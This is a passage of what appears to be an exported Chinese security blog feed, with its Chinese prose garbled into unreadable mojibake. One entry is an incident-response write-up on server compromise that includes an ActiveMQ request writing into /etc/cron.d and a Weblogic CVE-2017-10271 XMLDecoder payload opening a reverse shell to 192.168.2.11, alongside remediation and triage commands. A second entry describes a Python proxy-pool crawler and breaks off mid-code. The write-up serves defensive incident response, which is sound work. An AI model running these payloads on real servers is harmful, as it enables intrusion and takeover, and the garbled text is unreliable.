éœ€ç™»å½•ã€‚ç›®å‰è§åˆ°çš„æ˜¯ç›´æ¥å†™å…¥cronæŒ–çŸ¿ï¼Œç®€å•ç²—æš´ï¼ æ’æŸ¥æ–¹æ³•ï¼š 123456789PUT /fileserver/test.txt HTTP/1.1Host: ip:8161Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 4test å†™å…¥åˆ°è®¡åˆ’ä»»åŠ¡ 12345678MOVE /fileserver/text.txt HTTP/1.1Destination: file:///etc/cron.d/rootHost: ip:8161Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Length: 0 ä¿®å¤æ–¹æ³•ï¼š ä¸¥ç¦å¼±å£ä»¤ï¼Œä½¿ç”¨æ•°å­—+å­—æ¯+ç‰¹æ®Šå­—ç¬¦çš„åä½ä»¥ä¸Šå¼ºå¯†ç  åŠæ—¶å‡çº§ActiveMQè¡¥ä¸ å®‰å…¨ç»„ã€é˜²ç«å¢™ç­‰è®¾ç½®è®¿é—®ç™½åå• 4ã€çˆ†ç ´ä¸»è¦æ˜¯Windows3389ã€Linux sshçˆ†ç ´ï¼Œçˆ†ç ´æˆåŠŸä¹‹åç›´æ¥æ‰§è¡Œå‘½ä»¤è¿›è¡ŒæŒ–çŸ¿ã€DDoSã€‚ æ’æŸ¥æ–¹æ³•ï¼š ç½‘ä¸Šæœç´¢è‡ªå·±çš„å¯†ç æ˜¯å¦è¢«å…¬å¼€æ´»åœ¨é»‘å®¢å­—å…¸ä¸­ ä¿®å¤æ–¹æ³•ï¼š ä¸¥ç¦å¼±å£ä»¤ï¼Œä½¿ç”¨æ•°å­—+å­—æ¯+ç‰¹æ®Šå­—ç¬¦çš„åä½ä»¥ä¸Šå¼ºå¯†ç  å®‰å…¨ç»„ã€é˜²ç«å¢™ç­‰è®¾ç½®ç™½åå•è®¿é—® 5ã€Struts2åˆ©ç”¨Struts2ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œï¼Œç›´æ¥æ‰§è¡Œç›¸å…³å‘½ä»¤ã€‚ æ’æŸ¥æ–¹æ³•ï¼š æœç´¢ç½‘ä¸Šä¸€é”®æ‰«æstruts2æ¼æ´çš„å·¥å…·è¿›è¡Œæ£€æµ‹ ä¿®å¤æ–¹æ³•ï¼š åŠæ—¶å‡çº§Struts2ç›¸å…³è¡¥ä¸6ã€Java RMIå‘½ä»¤æ‰§è¡Œ RMIæœåŠ¡çš„é»˜è®¤å¼€æ”¾1099ç«¯å£ï¼Œä¸”æš´éœ²åœ¨å…¬ç½‘ä¸­ï¼Œå¹¶ä¸”æ°å¥½ä½¿ç”¨äº†Apache Commons Collectionsçš„ç¼ºé™·ç‰ˆæœ¬ï¼Œå¯è¢«ç›´æ¥åˆ©ç”¨æ¥è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ æ’æŸ¥æ–¹æ³•ï¼š ä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ ä¿®å¤æ–¹æ³•ï¼š å‡çº§ç›¸åº”ç¼ºé™·ç‰ˆæœ¬ å®‰å…¨ç»„ã€é˜²ç«å¢™ç­‰è®¾ç½®æ‹’ç»RMIç«¯å£è®¿é—® 7ã€Weblogicç›®å‰è§åˆ°çš„ä¸»è¦è¢«åˆ©ç”¨çš„æ˜¯Weblogic wls-wsat XMLDecoderååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-10271ï¼‰ã€‚ Weblogicçš„WLS Securityç»„ä»¶å¯¹å¤–æä¾›webserviceæœåŠ¡ï¼Œå…¶ä¸­ä½¿ç”¨äº†XMLDecoderæ¥è§£æç”¨æˆ·ä¼ å…¥çš„XMLæ•°æ®ï¼Œåœ¨è§£æçš„è¿‡ç¨‹ä¸­å‡ºç°ååºåˆ—åŒ–æ¼æ´ï¼Œå¯¼è‡´å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ æ’æŸ¥æ–¹æ³•ï¼š å‘é€å¦‚ä¸‹æ•°æ®åŒ…ï¼Œæ³¨æ„å…¶ä¸­åå¼¹shellçš„è¯­å¥ï¼Œéœ€è¦è¿›è¡Œç¼–ç ï¼Œå¦åˆ™è§£æXMLçš„æ—¶å€™å°†å‡ºç°æ ¼å¼é”™è¯¯ï¼š 12345678910111213141516171819202122232425262728293031POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: IP:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.2.11/8080 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; ä¿®å¤æ–¹æ³•ï¼š å‡çº§weblogicç›¸å…³è¡¥ä¸åˆ°æœ€æ–°ç‰ˆæœ¬ å®‰å…¨ç»„ã€é˜²ç«å¢™ç­‰è®¾ç½®ç›¸å…³æ•æ„Ÿç«¯å£ç™½åå•è®¿é—® 0x03 åº”æ€¥å“åº”å¿«é€Ÿæ’æŸ¥æ­¥éª¤ä»¥Linuxä¸ºä¾‹ï¼Œä»¥ä¸‹ç›¸å…³æ­¥éª¤åªé’ˆå¯¹æŒ–çŸ¿ã€DDoSç›¸å…³å®‰å…¨äº‹ä»¶çš„æ’æŸ¥ï¼Œä»¥ä¾¿å¿«é€Ÿã€é«˜æ•ˆè§£å†³é—®é¢˜ã€‚å…¶ä»–å®‰å…¨äº‹ä»¶æŒ‰ç…§é€šç”¨äº‹ä»¶æ’æŸ¥æ­¥éª¤å³å¯ã€‚ æ£€æŸ¥è¿›ç¨‹åŠæ–‡ä»¶top -c ï¼š å¿«é€ŸæŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ï¼Œå¹¶è·å–è¿›ç¨‹æ–‡ä»¶ä½ç½® kill -9 PID ï¼š æ€æ­»è¿›ç¨‹ æ ¹æ®æ¶æ„è¿›ç¨‹ã€æ–‡ä»¶ç‰¹å¾å¦‚ï¼šæ–‡ä»¶åã€æ–‡ä»¶å¤§å°ã€æ–‡ä»¶åˆ›å»ºæ—¶é—´è¿›è¡Œå…¨ç›˜æœç´¢ grep -rni &quot;shell.name&quot; * ï¼š æ ¹æ®æ–‡ä»¶åç‰¹å¾æŸ¥æ‰¾ find / -size 1223123c ï¼š æ ¹æ®æ–‡ä»¶å¤§å°ç‰¹å¾æŸ¥æ‰¾ find / -mtime 1 -name * ï¼š æ ¹æ®æ–‡ä»¶åˆ›å»ºæ—¶é—´æŸ¥æ‰¾ lsof -p PIDï¼šæŸ¥çœ‹è¿›ç¨‹å ç”¨ä¿¡æ¯ cd /proc/PID ï¼š è¿›å…¥åˆ°è¿›ç¨‹ä¸­ cat * |strings -n 5 |more ï¼š è¯»å–è¯¥è¿›ç¨‹å†…å­˜ä¸­çš„ä¿¡æ¯ æ£€æµ‹ç½‘ç»œlsof -i:5000 ï¼š æŸ¥çœ‹5000ç«¯å£çš„å ç”¨æƒ…å†µ netstat -nap ï¼š æŸ¥çœ‹ä¸æ­£å¸¸ç«¯å£ netstat -an | grep tcp | awk &#39;{print $5}&#39; ï¼š æŸ¥çœ‹TCPè¿æ¥ netstat -an | grep SYN | awk &#39;{print $5}&#39; | awk -F: &#39;{print $1}&#39; | sort | uniq -c | sort -nr | more ï¼š æŸ¥çœ‹SYNè¿æ¥ æ£€æŸ¥è®¡åˆ’ä»»åŠ¡crontab -u root -l ï¼š æŸ¥çœ‹rootç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡ cat /etc/crontab ï¼š æŸ¥çœ‹/etc/crontab ls -al /etc/cron.* ï¼š æŸ¥çœ‹cronæ–‡ä»¶æ˜¯å¦å˜åŒ–çš„è¯¦ç»†ä¿¡æ¯ ll /var/spool/cron/ ï¼š æŸ¥çœ‹/var/spool/cron/ æ£€æŸ¥ç³»ç»Ÿå‘½ä»¤123ls -alt /bin/ | head -n 10ls -alt /usr/sbin/ | head -n 10ls -alt /usr/bin/ | head -n 10 Webshell1ã€æ²³é©¬ 2ã€è‡ªå†™è„šæœ¬ï¼ˆæ¨èï¼Œå› ä¸ºå¯æ ¹æ®æƒ…å†µï¼Œè‡ªå·±åŠ ç‰¹å¾ç­‰ï¼‰ ä½¿ç”¨æ€æ¯’è½¯ä»¶ClamAV 123æ‰«æï¼šclamscan -r /usr â€”max-dir-recursion=5 -l /tmp/clamav.logç§»é™¤ï¼šclamscan -r â€”remove /usr/bin/ rkhunter 123rkhunter --propupdrkhunter --check æ³¨æ„äº‹é¡¹1ã€ä¸€å®šè¦æŸ¥çœ‹ç³»ç»Ÿå‘½ä»¤æ˜¯å¦è¢«æ›¿æ¢ï¼Œå¦åˆ™æ‰€åšçš„éƒ½æ˜¯ä¸€åˆ‡å¾’åŠ³ã€‚ã€‚ã€‚ 2ã€è‹¥ç³»ç»Ÿæ›¿æ¢å¯ç”¨å…¶ä»–ä»£æ›¿ï¼Œå¦‚ï¼špsä½¿ç”¨topï¼Œnetstatä½¿ç”¨ssç­‰ 3ã€lsof -n |grep delete æŸ¥æ‰¾å·²ç»åˆ é™¤ä½†æ˜¯è¿˜åœ¨ä½¿ç”¨çš„æ–‡ä»¶ 4ã€ç•™æ„ä¸‹æ˜¯å¦æœ‰SSHåé—¨ 5ã€æ³¨æ„æ˜¯å¦å­˜åœ¨éšè—è¿›ç¨‹ 6ã€å®åœ¨æ— æ³•åˆ é™¤å¯ä½¿ç”¨chattr +ié”å®šç›¸åº”è®¡åˆ’ä»»åŠ¡æ–‡ä»¶ 7ã€å®åœ¨ä¸è¡Œä¿®æ”¹æŠŠcurl ï¼Œwget ,lynx æ–‡ä»¶å…¨å±€é‡å‘½å é™„ï¼šè®°ä¸€æ¬¡äº‹ä»¶åˆ†æè¯¦ç»†æ’æŸ¥æ­¥éª¤1ã€äº‹ä»¶ç¼˜ç”±å®¢æˆ·åé¦ˆæœåŠ¡å™¨Dç›˜é‡Œé¢çš„æ–‡ä»¶è¢«åˆ é™¤äº†ï¼Œè¦æ±‚æ’æŸ¥ä»€ä¹ˆåŸå› å¯¼è‡´çš„ï¼Œä»€ä¹ˆæ¼æ´å¼•å‘çš„ã€‚ 2ã€äº‹ä»¶åˆ†æå‰æœŸå‡†å¤‡å·¥ä½œï¼šç«¯å£æ‰«æã€é»‘ç›’æ¼æ‰«ã€å¼±å£ä»¤ã€æ˜¯å¦å­˜åœ¨å‘½ä»¤æ‰§è¡Œç›¸å…³æ¼æ´ç­‰ï¼Œæœªæœï¼Œè¿›å…¥æœåŠ¡å™¨æ’æŸ¥ã€‚ Dç›¾å…¨ç›˜webshellæŸ¥æ€å‘ç°æ¶æ„æ–‡ä»¶ï¼ˆä¸­é—´çš„ä¸€äº›ç”¨æˆ·ï¼Œç»„ï¼Œè¿›ç¨‹ï¼Œæ—¥å¿—æ’æŸ¥æ­¥éª¤ç­‰æˆ‘å°±ä¸è¯´äº†ï¼‰ webshellåä¸ºenshell.aspx æ ¹æ®è¯¥webshellæ–‡ä»¶åæŸ¥æ‰¾æ—¥å¿— å®šä½è®°å½•è¯¥æ¶æ„æ–‡ä»¶çš„æ—¥å¿—ä¿¡æ¯ï¼Œæ‰¾åˆ°æ”»å‡»è€…IP æ”»å‡»è€…IPï¼š110.87.13.61 å¨èƒæƒ…æŠ¥æ¥ä¸€æ³¢ æ ¹æ®IPå®šä½é»‘å®¢æ”»å‡»ç‚¹ å®šä½è®°å½•è¯¦æƒ… å®šä½æ¼æ´æºå¤´ è‡³æ­¤ï¼Œäº‹ä»¶åˆ†æç»“æŸã€‚ 3ã€äº‹ä»¶ç»“è®ºç”±æ­¤å¯çŸ¥ï¼šé»‘å®¢å…ˆåˆ©ç”¨/xxx/upload2Server/æ¥å£ä¸Šä¼ äº†æ¶æ„æ–‡ä»¶ï¼Œå†åˆ©ç”¨/xxx/checkfileexists/åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸï¼Œæœ€ååˆ©ç”¨ï¼Œ/xxx/executecmd/æ‰§è¡Œäº†è¯¥æ¶æ„æ–‡ä»¶ã€‚]]></content>
      <tags>
        <tag>çˆ†ç ´</tag>
        <tag>linux</tag>
        <tag>åº”æ€¥å“åº”</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>Redis</tag>
        <tag>æœªæˆæƒè®¿é—®</tag>
        <tag>Memcache</tag>
        <tag>Weblogic</tag>
        <tag>ActiveMQ</tag>
        <tag>Tomcat</tag>
        <tag>Kubernetes</tag>
        <tag>RMI</tag>
        <tag>Docker</tag>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PrxoyPool-å…è´¹ä»£ç†æ± çš„è®¾è®¡ä¸å®ç°]]></title>
    <url>%2F2018%2F04%2F27%2FPrxoyPool-%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[å‰è¨€åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•ã€æ¼æ´æŒ–æ˜çš„æ—¶å€™ï¼Œä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·æ˜¯å¿…é¡»çš„ä¸€æ­¥ï¼Œä½†æ˜¯ä»¤äººğŸ˜ çš„æ˜¯ï¼Œç»å¸¸ç”±äºæ‰«æç­‰åŸå› å¯¼è‡´IPè¢«banï¼Œè¿™æ˜¯æˆ‘ä»¬æœ€ä¸æƒ³çœ‹åˆ°çš„ã€‚æ‰€ä»¥æœ¬ç€å­¦ä¹ ç¼–ç¨‹çš„ç›®çš„ï¼Œæ ¹æ®ç½‘ä¸Šæœç´¢çš„èµ„æ–™ï¼Œä¸œæ‹¼è¥¿å‡‘çš„å¼€å‘äº†è¿™ä¸ªç³»ç»Ÿã€‚ 0x01 æ¶‰åŠæŠ€æœ¯ Python3 ä½¿ç”¨Python3çš„åŸå› æ˜¯ç”±äºå¼‚æ­¥IOä½¿ç”¨çš„æ˜¯asyncioå’Œaiohttpï¼Œæ‰€ä»¥å°±å­¦ä¹ å°è¯•äº†ä¸‹Python3ï¼Œå…¶å®æ²¡å¤šå¤§åŒºåˆ«æ„Ÿè§‰ã€‚ï¼ˆåˆšå¼€å§‹å­¦ç¼–ç¨‹ï¼ŒåŸè°…æˆ‘å•¥éƒ½ä¸çŸ¥é“ğŸ˜œï¼‰ Flask ä½¿ç”¨Flaskä½œä¸ºWebå¼€å‘å¾®æ¡†æ¶ï¼Œäº¤ä¸å…¶ä»–Pythonæ¡†æ¶ï¼Œå…·æœ‰ç®€ä¾¿ã€æ˜“æ‰©å±•ç­‰ä¼˜ç‚¹ã€‚å…·ä½“å¯çœ‹ï¼šFlaskä¸­æ–‡æ–‡æ¡£ Redis Redis æ˜¯é€Ÿåº¦éå¸¸å¿«çš„éå…³ç³»å‹ï¼ˆNoSQLï¼‰å†…å­˜é”®å€¼æ•°æ®åº“ï¼Œå¯ä»¥å­˜å‚¨é”®å’Œäº”ç§ä¸åŒç±»å‹çš„å€¼ä¹‹é—´çš„æ˜ å°„ã€‚ äº”ç§ç±»å‹æ•°æ®ç±»å‹ä¸ºï¼šå­—ç¬¦ä¸²ã€åˆ—è¡¨ã€é›†åˆã€æœ‰åºé›†åˆã€æ•£åˆ—è¡¨ã€‚æœ¬æ¬¡æ•°æ®å­˜å‚¨æ–¹é¢å°±åˆ©ç”¨çš„redisçš„æœ‰åºé›†åˆã€‚ çˆ¬è™« çˆ¬è™«éƒ¨åˆ†æ˜¯ä»11ä¸ªå…è´¹ä»£ç†ç½‘ç«™ä¸ŠæŠ“å–å…è´¹ã€é«˜å¯ç”¨æ€§çš„ä»£ç†IPï¼Œå¹¶è¿›è¡Œæ•°æ®å¤„ç†è·å–ç»Ÿä¸€æ ¼å¼ã€‚åŒæ—¶æœ¬ç€å­¦ä¹ çš„ç†å¿µä½¿ç”¨äº†ï¼šlxmlï¼Œpyqueryï¼Œæ­£åˆ™ï¼Œjsonç­‰ä¸åŒçš„æŠ€æœ¯æ¥å®ç°ã€‚ å¼‚æ­¥IO é»˜è®¤ç»™ä»£ç†æ± è®¾ç½®çš„é˜ˆå€¼ä¸º50000ï¼Œç”±äºæ•°é‡æ¯”è¾ƒå¤§ï¼Œä¸ºäº†æé«˜ä»£ç†é«˜å¯ç”¨æ€§çš„æ£€æµ‹æ•ˆç‡ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œä½¿ç”¨å¼‚æ­¥è¯·æ±‚åº“aiohttpæ¥è¿›è¡Œæ£€æµ‹ã€‚å…·ä½“å‚è€ƒï¼šå»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™-å¼‚æ­¥IO å‰ç«¯ webå‰ç«¯éƒ¨åˆ†æˆ‘æ˜¯çœŸä¸æ‡‚ï¼ˆä½†æ˜¯æˆ‘ä¼šæŠ„å•ŠğŸ˜ï¼‰ï¼Œç›´æ¥wgetçš„ä¸€ä¸ªè‡ªå·±è§‰å¾—æ¯”è¾ƒç®€æ´çš„ç½‘ç«™çš„å‰ç«¯ï¼Œå“ˆå“ˆğŸ˜„ï½ 0x02 æ¶æ„éƒ¨åˆ† ä¸»è¦åˆ†ä¸ºå¦‚ä¸‹å‡ ä¸ªæ¨¡å—ï¼š çˆ¬è™«æ¨¡å—ï¼š ä¸»è¦ä»11ä¸ªå…è´¹ä»£ç†ç½‘ç«™ä¸ŠæŠ“å–å…è´¹çš„ä»£ç†IPï¼Œå¹¶è¿›è¡Œæ ¼å¼ç»Ÿä¸€å¤„ç†ã€‚åŒæ—¶ä¸ºäº†ä¿è¯ä»£ç†æ± çš„æ¯ç«­ï¼Œé‡‡ç”¨å‘¨æœŸæ€§æŠ“å–ã€‚ 1234567891011www.66ip.cnwww.xdaili.cnwww.kuaidailiwww.ip3366.netwww.89ip.cnwww.xicidaili.comwww.iphai.compremproxy.comwww.xroxy.comwww.data5u.comwww.kxdaili.com å­˜å‚¨æ¨¡å— ä¸»è¦å­¦ä¹ äº†GitHubä¸Šä¸€ä¸ªé‡‡ç”¨çš„redisçš„æœ‰åºé›†åˆæ¥è¿›è¡Œçš„ï¼Œä¸€æ˜¯ä¿è¯ä»£ç†æ•°æ®çš„ä¸é‡å¤ï¼ŒäºŒæ˜¯ä½¿ç”¨zscoreæ¥æ ‡è®°ä»£ç†çš„å¯ç”¨æ€§ã€‚ æ£€æµ‹æ¨¡å— å®šæ—¶æ£€æµ‹æ•°æ®åº“ä¸­çš„ä»£ç†çš„å¯ç”¨æ€§æƒ…å†µï¼Œå¹¶é‡‡ç”¨æ‰“åˆ†æœºåˆ¶ï¼Œåˆå§‹åŒ–ä¸€ä¸ªåˆ†å€¼ï¼Œè‹¥å¯ç”¨åˆ™æ ‡è®°ä¸ºæœ€é«˜ï¼Œä¸å¯ç”¨åˆ™åœ¨åˆå§‹åŒ–åˆ†å€¼åŸºç¡€ä¸Šå‡1ï¼Œç›´åˆ°ä¸º0ï¼Œåˆ™ä»redisä¸­åˆ é™¤ã€‚åç»­randomè·å–çš„æ—¶å€™é‡‡ç”¨åˆ†å€¼æœ€é«˜çš„ä¼˜å…ˆå±•ç¤ºçš„ä»é«˜åˆ°ä½æ¨¡å¼ã€‚åŒæ—¶ä¿è¯ä»£ç†çš„å®æ—¶å¯ç”¨æ€§ï¼Œè®¾ç½®å®šæ—¶æ£€æµ‹ã€‚ APIæ¨¡å— é‡‡ç”¨Flaskä½œä¸ºwebæœåŠ¡å™¨ï¼Œå‰ç«¯copyçš„åˆ«äººçš„æ”¹çš„ã€‚ä»redisæ•°æ®åº“ä¸­ä¼˜å…ˆé€‰æ‹©å‡ºåˆ†æ•°æœ€é«˜çš„ï¼Œè‹¥åŒæ—¶å­˜åœ¨å¤šä¸ªï¼Œåˆ™éšæœºé€‰æ‹©ä¸€ä¸ªã€‚ â€‹ 0x03 å…·ä½“å®ç°çˆ¬è™«æ¨¡å—1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071def crawl_daili66(self, page_count=4): &quot;&quot;&quot; è·å–ä»£ç†:www.66ip.cn æ–¹æ³•:pyquery &quot;&quot;&quot; start_url = &apos;http://www.66ip.cn/&#123;&#125;.html&apos; urls = [start_url.format(page) for page in range(1, page_count + 1)] for url in urls: html = get_page(url) if html: doc = pq(html) trs = doc(&apos;.containerbox table tr:gt(0)&apos;).items() for tr in trs: ip = tr.find(&apos;td:nth-child(1)&apos;).text() port = tr.find(&apos;td:nth-child(2)&apos;).text() yield &apos;:&apos;.join([ip, port])def crawl_ip181(self, page_count=2): &quot;&quot;&quot; è·å–ä»£ç†:www.xdaili.cn æ–¹æ³•:json &quot;&quot;&quot; start_url = &apos;http://www.xdaili.cn/ipagent//freeip/getFreeIps?page=&#123;&#125;&apos; urls = [start_url.format(page) for page in range(1, page_count + 1)] for url in urls: try: response = requests.get(url) print(&apos;æŠ“å–æˆåŠŸ &gt;&gt;&gt; &apos;, url, response.status_code) if response.status_code == 200: html = response.json() except ConnectionError: print(&apos;æŠ“å–å¤±è´¥ &gt;&gt;&gt; &apos;, url) pass if html: # ip_address = re.compile(r&apos;&quot;ip&quot;:&quot;(.*?)&quot;,&quot;port&quot;:&quot;(.*?)&quot;&apos;) # ip_address = ip_address.findall(html) for key in html[&apos;RESULT&apos;][&apos;rows&apos;]: yield &apos;:&apos;.join([key[&apos;ip&apos;], key[&apos;port&apos;]])def crawl_kuaidaili(self): &quot;&quot;&quot; è·å–ä»£ç†:www.kuaidaili æ–¹æ³•:xpath &quot;&quot;&quot; for i in range(1, 4): start_url = &apos;http://www.kuaidaili.com/free/inha/&#123;&#125;/&apos;.format(i) html = get_page(start_url) if html: html = etree.HTML(html, parser=etree.HTMLParser(encoding=&apos;utf-8&apos;)) _ip_xpath = &apos;//*[@id=&quot;list&quot;]/table/tbody/tr[&#123;&#125;]/td[1]/text()&apos; _port_xpath = &apos;//*[@id=&quot;list&quot;]/table/tbody/tr[&#123;&#125;]/td[2]/text()&apos; for i in range(1, 16): ip_xpath = _ip_xpath.format(i) port_xpath = _port_xpath.format(i) ip = html.xpath(ip_xpath)[0] port = html.xpath(port_xpath)[0] yield &quot;:&quot;.join([ip, port])def crawl_ip3366(self): &quot;&quot;&quot; è·å–ä»£ç†:www.ip3366.net æ–¹æ³•:æ­£åˆ™ &quot;&quot;&quot; for page in range(1, 4): start_url = &apos;http://www.ip3366.net/free/?stype=1&amp;page=&#123;&#125;&apos;.format(page) html = get_page(start_url) ip_address = re.compile(&apos;&lt;tr&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;&apos;) re_ip_address = ip_address.findall(html) for address, port in re_ip_address: result = address + &apos;:&apos; + port yield result.replace(&apos; &apos;, &apos;&apos;) æœ¬ç€å­¦ä¹ çš„ç›®çš„ï¼ŒåŒæ—¶é‡‡ç”¨äº†pyqueryï¼Œæ­£åˆ™ï¼Œjsonï¼Œxpathç­‰ä¸åŒçš„è·å–æ–¹æ³•ï¼Œä½¿ç”¨yieldæ¥å°†è¿™äº›æ–¹æ³•å®šä¹‰æˆç”Ÿæˆå™¨ï¼Œè¿™æ ·æˆ‘ä»¬æ¯æ¬¡è¯·æ±‚å°±ä¼šé€šè¿‡yieldæ¥è¿”å›ä¸€ä¸ªä»£ç†IPã€‚ åŒæ—¶ä½¿ç”¨crawl_å¼€å¤´çš„å‡½æ•°å‘½åæ–¹æ³•ï¼Œæ¥è¾¾åˆ°åŠ¨æ€æ·»åŠ ä»£ç†ç½‘ç«™åœ°å€æ¥å£çš„ç›®çš„ï¼ˆè¿™éƒ¨åˆ†å€Ÿé‰´çš„å¤§ç¥çš„ï¼‰ï¼Œå…·ä½“å‚è€ƒï¼špythonå…ƒç±»è§£æ 12345678910111213141516171819class ProxyMetaclass(type): def __new__(cls, name, bases, attrs): count = 0 attrs[&apos;__CrawlFunc__&apos;] = [] for k, v in attrs.items(): if &apos;crawl_&apos; in k: attrs[&apos;__CrawlFunc__&apos;].append(k) count += 1 attrs[&apos;__CrawlFuncCount__&apos;] = count return type.__new__(cls, name, bases, attrs)class Crawler(object, metaclass=ProxyMetaclass): def get_proxies(self, callback): proxies = [] for proxy in eval(&quot;self.&#123;&#125;()&quot;.format(callback)): print(u&apos;æˆåŠŸè·å–åˆ°ä»£ç† &gt;&gt;&gt; &apos;, proxy) proxies.append(proxy) return proxies å®šä¹‰ç±»ProxyMetaclasså¹¶å£°æ˜ä¸€ä¸ª__new__æ–¹æ³•ï¼ŒåŒæ—¶Crawlerç±»å°†å®ƒå£°æ˜ä¸ºå…ƒç±»ï¼Œè¿™ä¸ªæ–¹æ³•æœ‰å›ºå®šçš„å‡ ä¸ªå‚æ•°cls, name, bases, attrsï¼Œç¬¬å››ä¸ªå‚æ•°attrsä¸­åŒ…å«äº†ç±»çš„ä¸€äº›å±æ€§ã€‚æˆ‘ä»¬å¯ä»¥éå†attrsè¿™ä¸ªå‚æ•°å³å¯è·å–ç±»çš„æ‰€æœ‰æ–¹æ³•ä¿¡æ¯ï¼Œå°±åƒéå†å­—å…¸ä¸€æ ·ï¼Œé”®åå¯¹åº”æ–¹æ³•çš„åç§°ã€‚ç„¶ååˆ¤æ–­æ–¹æ³•çš„å¼€å¤´æ˜¯å¦crawl_ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å°†å…¶åŠ å…¥åˆ°__CrawlFunc__å±æ€§ä¸­ã€‚è¿™æ ·æˆ‘ä»¬å°±æˆåŠŸå°†æ‰€æœ‰ä»¥crawl_å¼€å¤´çš„æ–¹æ³•å®šä¹‰æˆäº†ä¸€ä¸ªå±æ€§ï¼ŒåŠ¨æ€è·å–åˆ°æ‰€æœ‰ä»¥crawl_å¼€å¤´çš„æ–¹æ³•åˆ—è¡¨ã€‚ ç„¶åå®šä¹‰äº†ä¸€ä¸ªget_proxies()æ–¹æ³•ï¼Œå°†æ‰€æœ‰ä»¥crawl_å¼€å¤´çš„æ–¹æ³•è°ƒç”¨ä¸€éï¼Œè·å–æ¯ä¸ªæ–¹æ³•è¿”å›çš„ä»£ç†å¹¶ç»„åˆæˆåˆ—è¡¨å½¢å¼è¿”å›ã€‚ å­˜å‚¨æ¨¡å—é‡‡ç”¨redisçš„æœ‰åºé›†åˆï¼Œé›†åˆçš„ç‰¹ç‚¹æ˜¯é›†åˆçš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½æ˜¯ä¸é‡å¤çš„ï¼Œè¿™æ ·å°±ä¿è¯äº†ä»£ç†çš„ä¸é‡å¤ã€‚æœ‰åºé›†åˆï¼Œé¡¾åæ€ä¹‰ï¼Œè¿™é‡Œå­˜å‚¨çš„æ•°æ®æ˜¯æœ‰åºçš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ç‚¹å¯¹ä»£ç†IPè¿›è¡Œæ‰“åˆ†ã€æ’åºï¼Œå®ç°æƒé‡çš„æ•ˆæœã€‚å…·ä½“å¯å‚è€ƒï¼šRedis æœ‰åºé›†åˆ(sorted set) è¿æ¥redis 1db = redis.StrictRedis(host=host, port=port, password=password, decode_responses=True) æ·»åŠ æ•°æ®ï¼Œæ·»åŠ ä»£ç†ï¼Œè®¾ç½®åˆ†æ•°ä¸ºæœ€é«˜ 123456def add(self, proxy, score=INITIAL_SCORE): if not re.match(&apos;\d+\.\d+\.\d+\.\d+\:\d+&apos;, proxy): print(&apos;ä»£ç†ä¸ç¬¦åˆè§„èŒƒ&apos;, proxy, u&apos;ä¸¢å¼ƒ&apos;) return if not self.db.zscore(REDIS_KEY, proxy): return self.db.zadd(REDIS_KEY, score, proxy) è·å–ä»£ç†IPï¼Œéšæœºè·å–æœ‰æ•ˆä»£ç†ï¼Œé¦–å…ˆå°è¯•è·å–æœ€é«˜åˆ†æ•°ä»£ç†ï¼Œå¦‚æœä¸å­˜åœ¨ï¼ŒæŒ‰ç…§æ’åè·å–ï¼Œå¦åˆ™å¼‚å¸¸ 1234567891011def random(self): result = self.db.zrangebyscore(REDIS_KEY, MAX_SCORE, MAX_SCORE) if len(result): return choice(result) else: result = self.db.zrevrange(REDIS_KEY, 0, 100) if len(result): return choice(result) else: raise PoolEmptyError åˆ é™¤ä»£ç†IPï¼Œä»£ç†å€¼å‡ä¸€åˆ†ï¼Œå°äºæœ€å°å€¼åˆ™åˆ é™¤ 123456789def decrease(self, proxy): score = 